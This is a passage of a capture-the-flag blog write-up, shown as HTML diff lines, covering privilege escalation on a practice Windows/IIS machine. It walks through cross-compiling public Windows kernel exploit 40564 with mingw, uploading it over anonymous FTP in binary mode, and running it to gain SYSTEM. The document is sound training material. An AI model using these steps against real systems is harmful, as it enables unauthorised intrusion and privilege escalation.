+<p>Let&rsquo;s do a quick search using <code>apt</code> to find the right package to install:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ apt search mingw
+[...]
+mingw-w64/kali-rolling 8.0.0-1 all
+  Development environment targeting 32- and 64-bit Windows
+[...]
+</code></pre></div><p>Install mingw-w64:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">apt install mingw-w64
+</code></pre></div><p>Compile the previously downloaded exploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
+</code></pre></div><p>/!\ Apparently the order of the argument matters:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ i686-w64-mingw32-gcc -o 40564.exe -lws2_32 40564.c 
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0x8e6): undefined reference to `_imp__WSAStartup@8&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0x964): undefined reference to `_imp__WSASocketA@24&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0x977): undefined reference to `_imp__WSAGetLastError@0&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0x9b4): undefined reference to `_imp__inet_addr@4&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0x9cb): undefined reference to `_imp__htons@4&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0xa00): undefined reference to `_imp__connect@12&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0xa13): undefined reference to `_imp__WSAGetLastError@0&#39;
+/usr/bin/i686-w64-mingw32-ld: /tmp/cclVdVHI.o:40564.c:(.text+0xf7b): undefined reference to `_imp__WSACleanup@0&#39;
+</code></pre></div><ul>
+<li><code>-o &lt;filename&gt;</code> specifies the name of the output file</li>
+<li><code>-lws2_32</code> link to the Windows Socket 2.0 32-bit DLL</li>
+</ul>
+<h2 id="putting-the-exploit-on-the-machine">Putting the exploit on the machine</h2>
+<p>Transfer the exploit through the FTP:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; put 40564.exe
+local: 40564.exe remote: 40564.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+248650 bytes sent in 0.14 secs (1.7170 MB/s)
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\inetpub\wwwroot&gt;dir /s C:\40564.exe
+dir /s C:\40564.exe
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\inetpub\wwwroot
+
+26/10/2020  02:09 ��           248.650 40564.exe
+               1 File(s)        248.650 bytes
+
+     Total Files Listed:
+               1 File(s)        248.650 bytes
+               0 Dir(s)  24.383.385.600 bytes free
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">c:\inetpub\wwwroot&gt;40564.exe
+40564.exe
+This program cannot be run in DOS mode.
+</code></pre></div><p>Huh&hellip;. Asking our search engine yields <a href="https://security.stackexchange.com/a/179163">https://security.stackexchange.com/a/179163</a>. FTP has two modes to transfer files: ASCII and binary. Short story, ASCII is for plain-text files and may convert some characters (end of lines and control characters). Binary mode on the other hand does bit-by-bit exact transfer. The default mode is ASCII and it&rsquo;s probably not that good for our exploit.</p>
+<p>Use <code>binary</code> to switch to binary mode before transfering the exploit a second time:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ ftp $TARGET
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; binary
+200 Type set to I.
+ftp&gt; put 40564.exe
+local: 40564.exe remote: 40564.exe
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+247479 bytes sent in 0.13 secs (1.7622 MB/s)
+ftp&gt; 221 Goodbye.
+</code></pre></div><p>And it works way better:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">c:\inetpub\wwwroot&gt;40564.exe
+40564.exe
+c:\Windows\System32&gt;whoami
+whoami
+nt authority\system
+</code></pre></div><p>PS: sometimes your search for <code>user.txt</code> fails miserably, and that&rsquo;s okay, because there was a glitch in the matrix and the file is actually named <code>user.txt.txt</code> (same for <code>root.txt.txt</code>)</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\Users\babis\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of C:\Users\babis\Desktop
+
+18/03/2017  01:14 ��    &lt;DIR&gt;          .
+18/03/2017  01:14 ��    &lt;DIR&gt;          ..
+18/03/2017  01:18 ��                32 user.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.385.871.872 bytes free
+</code></pre></div><h1 id="takeaways">Takeaways</h1>
+<p>We saw how to:</p>
+<ul>
+<li>exploit a FTP that allows anonymous connections and let random people (including me) upload files on it</li>
+<li>how to cross-compile an exploit for Windows from kali</li>
+<li>how to use a Windows kernel exploit to do a privilege escalation</li>
+<li>how to transfer <em>correctly</em> an exploit through FTP</li>
+</ul>
+<p><img src="img/c32bfa16bcf864e478d3ddfe32440268.gif" alt=""></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#iis-httpd-75">IIS httpd 7.5</a>
+          <ul>
+            <li><a href="#trace">Trace</a></li>
+          </ul>
+        </li>
+        <li><a href="#microsoft-ftpd">Microsoft ftpd</a>
+          <ul>
+            <li><a href="#anonymous-login">Anonymous Login</a></li>
+            <li><a href="#webconfig">web.config</a></li>
+            <li><a href="#executing-asp-code">Executing ASP Code</a></li>
+            <li><a href="#generating-a-reverse-shell-with-msfvenom">Generating A Reverse Shell With msfvenom</a></li>
+            <li><a href="#a-real-shell">A Real Shell</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#cross-compiling-an-exploit">Cross-Compiling An Exploit</a></li>
+        <li><a href="#putting-the-exploit-on-the-machine">Putting the exploit on the machine</a></li>
+      </ul>
+    </li>
+    <li><a href="#takeaways">Takeaways</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
